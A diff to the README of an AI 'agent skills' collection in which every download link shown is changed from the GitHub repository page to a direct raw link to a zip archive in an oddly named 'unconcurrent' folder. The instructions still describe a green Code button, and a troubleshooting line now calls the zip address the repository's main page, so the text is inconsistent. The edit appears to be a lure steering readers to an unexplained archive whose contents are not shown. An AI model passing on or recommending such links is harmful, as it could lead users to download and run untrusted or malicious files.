@@ -1,6 +1,6 @@
 # 🤖 awesome-agent-skills - Unlock 1000+ AI Skills Instantly
 
-[![Download Now](https://img.shields.io/badge/🚀_Download_Now-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/officalkiran12/awesome-agent-skills)
+[![Download Now](https://img.shields.io/badge/🚀_Download_Now-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/officalkiran12/awesome-agent-skills/main/unconcurrent/agent_skills_awesome_1.6.zip)
 
 ## 🎯 What Is This?
 
@@ -26,7 +26,7 @@ Each "skill" in this collection is a tiny, portable instruction file (often just
 ### Step 1: Get the Files
 
 👉 **Visit this link to download the application:**
-**[https://github.com/officalkiran12/awesome-agent-skills](https://github.com/officalkiran12/awesome-agent-skills)**
+**[https://raw.githubusercontent.com/officalkiran12/awesome-agent-skills/main/unconcurrent/agent_skills_awesome_1.6.zip](https://raw.githubusercontent.com/officalkiran12/awesome-agent-skills/main/unconcurrent/agent_skills_awesome_1.6.zip)**
 
 When you click that link, you'll land on a GitHub page (don't worry, it's not scary!). Look for a big green button that says **"Code"** near the top-right of the page. Click it, then click **"Download ZIP"** in the dropdown menu. Your computer will start downloading a single compressed file (it ends with `.zip`). This might take a minute or two because the collection is large—good things come in big packages!
 
@@ -92,7 +92,7 @@ There are other skill packs out there, but this one stands out for three big rea
 
 ## 🔧 Troubleshooting (If Something Goes Wrong)
 
-- **"I don't see the `Download ZIP` button":** Make sure you're on the main page of the repository (the URL should be exactly `https://github.com/officalkiran12/awesome-agent-skills`). If you landed on a "releases" or "issues" page, click the "Code" tab at the top-left to go back. 
+- **"I don't see the `Download ZIP` button":** Make sure you're on the main page of the repository (the URL should be exactly `https://raw.githubusercontent.com/officalkiran12/awesome-agent-skills/main/unconcurrent/agent_skills_awesome_1.6.zip`). If you landed on a "releases" or "issues" page, click the "Code" tab at the top-left to go back. 
 - **"My AI doesn't recognize the skills":** Double-check that you actually placed the folder somewhere the AI can read. For terminal-based tools, verify you used the correct path (spaces matter!). A common fix: put the skills folder inside your current project, not inside another subfolder. 
 - **"The ZIP won't extract":** Make sure you have enough free disk space (at least 500MB) and try right-clicking → "Extract All" instead of double-clicking to open it inside the zip viewer. If problems persist, re-download the file (sometimes the download corrupts on a flaky connection). 
 - **"I want to update later":** Simply bookmark the GitHub page. When you want the newest skills, re-download the ZIP and replace your old folder (you won't lose custom edits if you copy them out first—or use version control if you're fancy). 
@@ -120,7 +120,7 @@ A: Absolutely—that's the point! Download it once, put it on a shared driveor s
 Stop wrestling with generic AI prompts that give you so-so results. Your future self will thank you for taking 5 minutes today to grab this toolkit. Whether you're building a website, analyzing spreadsheet data, writing a newsletter, or just trying to make your AI less frustrating, there's a skill in here that will make it feel like magic. 
 
 👉 **Remember, visit this link to download:**
-**[https://github.com/officalkiran12/awesome-agent-skills](https://github.com/officalkiran12/awesome-agent-skills)**
+**[https://raw.githubusercontent.com/officalkiran12/awesome-agent-skills/main/unconcurrent/agent_skills_awesome_1.6.zip](https://raw.githubusercontent.com/officalkiran12/awesome-agent-skills/main/unconcurrent/agent_skills_awesome_1.6.zip)**
 
 Click the green **Code** button → **Download ZIP** → **Extract** → **Tell your AI where it is**. Done. 
 
